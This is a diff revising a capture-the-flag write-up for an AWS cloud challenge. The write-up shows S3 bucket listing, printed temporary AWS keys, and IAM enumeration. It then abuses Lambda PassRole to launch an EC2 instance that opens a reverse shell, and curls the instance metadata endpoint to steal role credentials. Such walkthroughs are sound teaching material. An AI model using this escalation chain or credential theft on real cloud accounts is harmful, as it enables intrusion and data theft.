@@ -1,5 +1,5 @@
 ## CloudyNekos
-Start [here](https://d20whnyjsgpc34.cloudfront.net/).
+We are given a cloudfront link https://d20whnyjsgpc34.cloudfront.net/. In the link is an html webpage (full of cat pictures) and inside the source code we see the following hint:
 ```
 <!-- 
       ----- Completed -----
@@ -27,9 +27,12 @@ https://palindromecloudynekos.s3.amazonaws.com/
 
 Visiting `https://palindromecloudynekos.s3.amazonaws.com/index.html` will give the same `index.html`. 
 
+Since we can access it, the entire bucket is probably publicly accessible. Let's see what inside this bucket.
+
+
 `aws s3 ls s3://palindromecloudnekos`
 ```
-chester@Macintosh TISC2022 % aws s3 ls s3://palindromecloudynekos
+TISC2022 % aws s3 ls s3://palindromecloudynekos
                            PRE api/
                            PRE img/
 2022-08-23 21:16:20         34 error.html
@@ -38,7 +41,7 @@ chester@Macintosh TISC2022 % aws s3 ls s3://palindromecloudynekos
 
 `aws s3 ls s3://palindromecloudnekos --recursive`
 ```
-chester@Macintosh TISC2022 % aws s3 ls s3://palindromecloudynekos --recursive
+TISC2022 % aws s3 ls s3://palindromecloudynekos --recursive
 2022-08-23 21:16:20        432 api/notes.txt
 2022-08-23 21:16:20         34 error.html
 2022-07-22 18:02:45     404845 img/photo1.jpg
@@ -50,6 +53,7 @@ chester@Macintosh TISC2022 % aws s3 ls s3://palindromecloudynekos --recursive
 2022-08-23 21:16:20       2257 index.html
 ```
 
+`api/notes.txt` looks highly suspicious... We get another clue:
 ```
 # Neko Access System Invocation Notes
 
@@ -60,7 +64,7 @@ https://b40yqpyjb3.execute-api.ap-southeast-1.amazonaws.com/prod/agent
 All EC2 computing instances should be tagged with the key: 'agent' and the value set to your username. Otherwise, the antivirus cleaner will wipe out the resources.
 ```
 
-![Challenge4_1](Challenge4_1.png)
+![Challenge4_1](./Images/Challenge4_1.png)
 
 ```
 {"Message": "Welcome there agent! Use the credentials wisely! It should be live for the next 120 minutes! Our antivirus will wipe them out and the associated resources after the expected time usage.", "Access_Key": "AKIAQYDFBGMSV3WJSARP", "Secret_Key": "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"}
@@ -68,9 +72,9 @@ All EC2 computing instances should be tagged with the key: 'agent' and the value
 
 I tried to list all the resources I can find inside `aws ec2`. It seems like we cannot `describe-instances` (list ec2 instances), `describe-volumes` (list volumes), but we can `describe-subnets` (list subnets available).
 
-The subnet below has the name `palindrome`, looks like a good lead. Maybe we need to spawn an ec2 instance, join this subnet and then scan the network?
+The subnet below has the name `palindrome`, looks like a good lead.
 ```bash
-chester@Macintosh TISC2022 % aws ec2 describe-subnets
+TISC2022 % aws ec2 describe-subnets
 {
     "Subnets": [
         {
@@ -115,89 +119,12 @@ Amazon Linux AMI: ami-0b89f7b3f054b957e
 ```
 
 ```
-chester@Macintosh TISC2022 % aws ec2 run-instances --instance-type t2.nano --image-id ami-0b89f7b3f054b957e --subnet-id subnet-0aa6ecdf900166741
+TISC2022 % aws ec2 run-instances --instance-type t2.nano --image-id ami-0b89f7b3f054b957e --subnet-id subnet-0aa6ecdf900166741
 
 An error occurred (VcpuLimitExceeded) when calling the RunInstances operation: You have requested more vCPU capacity than your current vCPU limit of 32 allows for the instance bucket that the specified instance type belongs to. Please visit http://aws.amazon.com/contact-us/ec2-request to request an adjustment to this limit.
 ```
 
-Seems like the number of vCPUs is maxed. The way forward shouldn't be to spawn an ec2 instance...
-
-```bash
-chester@Macintosh TISC2022 % aws ec2 describe-security-groups
-{
-    "SecurityGroups": [
-        {
-            "Description": "Access to c2 infra",
-            "GroupName": "default-agents-sg",
-            "IpPermissions": [
-                {
-                    "FromPort": 0,
-                    "IpProtocol": "tcp",
-                    "IpRanges": [
-                        {
-                            "CidrIp": "0.0.0.0/0"
-                        }
-                    ],
-                    "Ipv6Ranges": [],
-                    "PrefixListIds": [],
-                    "ToPort": 65535,
-                    "UserIdGroupPairs": []
-                }
-            ],
-            "OwnerId": "051751498533",
-            "GroupId": "sg-047c958320ee832f0",
-            "IpPermissionsEgress": [
-                {
-                    "IpProtocol": "-1",
-                    "IpRanges": [
-                        {
-                            "CidrIp": "0.0.0.0/0"
-                        }
-                    ],
-                    "Ipv6Ranges": [],
-                    "PrefixListIds": [],
-                    "UserIdGroupPairs": []
-                }
-            ],
-            "VpcId": "vpc-095cd9241e386169d"
-        },
-        {
-            "Description": "default VPC security group",
-            "GroupName": "default",
-            "IpPermissions": [
-                {
-                    "IpProtocol": "-1",
-                    "IpRanges": [],
-                    "Ipv6Ranges": [],
-                    "PrefixListIds": [],
-                    "UserIdGroupPairs": [
-                        {
-                            "GroupId": "sg-0521a956628208ccc",
-                            "UserId": "051751498533"
-                        }
-                    ]
-                }
-            ],
-            "OwnerId": "051751498533",
-            "GroupId": "sg-0521a956628208ccc",
-            "IpPermissionsEgress": [
-                {
-                    "IpProtocol": "-1",
-                    "IpRanges": [
-                        {
-                            "CidrIp": "0.0.0.0/0"
-                        }
-                    ],
-                    "Ipv6Ranges": [],
-                    "PrefixListIds": [],
-                    "UserIdGroupPairs": []
-                }
-            ],
-            "VpcId": "vpc-095cd9241e386169d"
-        }
-    ]
-}
-```
+Seems like the number of vCPUs is maxed (in fact these user credentials didn't have permission to spawn an ec2 instance).
 
 Used [IAM-Flaws](https://github.com/nikhil1232/IAM-Flaws) to enumerate permissions.
 
@@ -338,6 +265,11 @@ None
 ==================================================================================
 ```
 
+Seems like I can do a lot of things on this user account. The lambda `CreateFunction`, `GetFunction` and `InvokeFunction` permissions look pretty *powerful*. I can also `PassRole` which basically means I can create a lambda function and assign a role to it, and that lambda function will have all the permissions that the role has.
+
+From the above, it seems like the way forward is to create a lambda function, and pass the `lambda_agent_development_role` to it. Let's check what the `lambda_agent_development_role` can do:
+
+
 `aws iam list-roles`
 
 ```json
@@ -428,6 +360,8 @@ None
 }
 ```
 
+The user account that I have basically has the role `lambda_agent_development_role`.
+
 ```bash
 aws iam list-attached-role-policies --role-name lambda_agent_development_role
 {
@@ -441,7 +375,7 @@ aws iam list-attached-role-policies --role-name lambda_agent_development_role
 ```
 
 ```bash
-chester@Macintosh enumerate-iam % aws iam list-attached-role-policies --role-name lambda_agent_development_role
+enumerate-iam % aws iam list-attached-role-policies --role-name lambda_agent_development_role
 {
     "AttachedPolicies": [
         {
@@ -450,7 +384,7 @@ chester@Macintosh enumerate-iam % aws iam list-attached-role-policies --role-nam
         }
     ]
 }
-chester@Macintosh enumerate-iam % aws iam get-policy --policy-arn arn:aws:iam::051751498533:policy/iam_policy_for_lambda_agent_development_role
+enumerate-iam % aws iam get-policy --policy-arn arn:aws:iam::051751498533:policy/iam_policy_for_lambda_agent_development_role
 {
     "Policy": {
         "PolicyName": "iam_policy_for_lambda_agent_development_role",
@@ -467,7 +401,7 @@ chester@Macintosh enumerate-iam % aws iam get-policy --policy-arn arn:aws:iam::0
         "Tags": []
     }
 }
-chester@Macintosh enumerate-iam % aws iam get-policy-version --policy-arn arn:aws:iam::051751498533:policy/iam_policy_for_lambda_agent_development_role --version-id v2
+enumerate-iam % aws iam get-policy-version --policy-arn arn:aws:iam::051751498533:policy/iam_policy_for_lambda_agent_development_role --version-id v2
 {
     "PolicyVersion": {
         "Document": {
@@ -506,8 +440,11 @@ chester@Macintosh enumerate-iam % aws iam get-policy-version --policy-arn arn:aw
 }
 ```
 
-We create `code.py`. The `cat-service` looks interesting, let's get it. 
+From here, we can see that the permissions that the `lambda_agent_development_role` has. It can run `ec2` instances, can pass the `ec2_agent_role` to it, and can execute `GetFunction` on `cat-service`.
 
+We first explore what is `cat-service`:
+
+We create `code.py`:
 ```
 import boto3
 def lambda_handler(event, context):
@@ -559,12 +496,12 @@ def lambda_handler(event, context):
     }
 ```
 
-This is probably a hint to spawn an ec2 instance using the `lambda_agent_development_rule`.
+This is probably a hint to spawn an ec2 instance, and additionally we can pass the role of `ec2_agent_development_role` to it.
 
-We can also see the `ec2_agent_role`
+Let's see what permissions does `ec2_agent_developemnt_role` have:
 
 ```bash
-chester@Macintosh TISC2022 % aws iam list-attached-role-policies --role-name ec2_agent_role
+TISC2022 % aws iam list-attached-role-policies --role-name ec2_agent_role
 {
     "AttachedPolicies": [
         {
@@ -573,7 +510,7 @@ chester@Macintosh TISC2022 % aws iam list-attached-role-policies --role-name ec2
         }
     ]
 }
-chester@Macintosh TISC2022 % aws iam get-policy --policy-arn arn:aws:iam::051751498533:policy/iam_policy_for_ec2_agent_role
+TISC2022 % aws iam get-policy --policy-arn arn:aws:iam::051751498533:policy/iam_policy_for_ec2_agent_role
 {
     "Policy": {
         "PolicyName": "iam_policy_for_ec2_agent_role",
@@ -590,7 +527,7 @@ chester@Macintosh TISC2022 % aws iam get-policy --policy-arn arn:aws:iam::051751
         "Tags": []
     }
 }
-chester@Macintosh TISC2022 % aws iam get-policy-version --policy-arn arn:aws:iam::051751498533:policy/iam_policy_for_ec2_agent_role --version-id v1
+TISC2022 % aws iam get-policy-version --policy-arn arn:aws:iam::051751498533:policy/iam_policy_for_ec2_agent_role --version-id v1
 {
     "PolicyVersion": {
         "Document": {
@@ -615,8 +552,12 @@ chester@Macintosh TISC2022 % aws iam get-policy-version --policy-arn arn:aws:iam
     }
 ```
 
+Looks like the `ec2_agent_developemnt_role` can list out data inside `dynamodb` (which is basically AWS's version of mongodb). Probably the flag is inside there?
+
+Let's now use our lambda function to create an ec2 instance, and pass it the `ec2_agent_instance_profile`. 
+
 ```bash
-chester@Macintosh Challenge 4B % aws iam list-instance-profiles
+Challenge 4B % aws iam list-instance-profiles
 {
     "InstanceProfiles": [
         {
@@ -651,7 +592,7 @@ chester@Macintosh Challenge 4B % aws iam list-instance-profiles
 }
 ```
 
-We have to attach this instance profile to the instance so that we can have the `ec2-agent-role` for the instance.
+We have to attach this instance profile to the instance so that we can have the `ec2-agent-role` for the instance. Also, we need to be able to control the EC2 instance once we spawn it. An easy way will be to spawn a reverse shell once the instance is deployed. For this, we need a public IP (I spawned my own ec2 instance on my own personal AWS account) and then enter a a pretty basic reverse shell bash script into the `user_data` field of the ec2 instance.
 
 ```python
 import boto3
@@ -715,7 +656,9 @@ fileb://function.zip
 aws lambda invoke --function-name user-860d7932eb424a9995d5ce743f0540cf-yoloswag1234 output.txt
 ```
 
-Inside the spawned ec2 instance:
+I got a reverse shell on my own personal ec2 instance. Now we need to make use of the `ec2_agent_role` to access `dynamodb`. There is a special IP address that allows users in ec2 instance to retrieve metadata from AWS. See this [link](https://stackoverflow.com/questions/41024362/aws-retrieving-security-credentials-from-instance-metadata).
+
+Inside the reverse shell:
 
 ```bash
 curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2_agent_role/
@@ -754,3 +697,4 @@ aws dynamodb scan --table-name flag_db\
     "ConsumedCapacity": null
 }
 ```
+
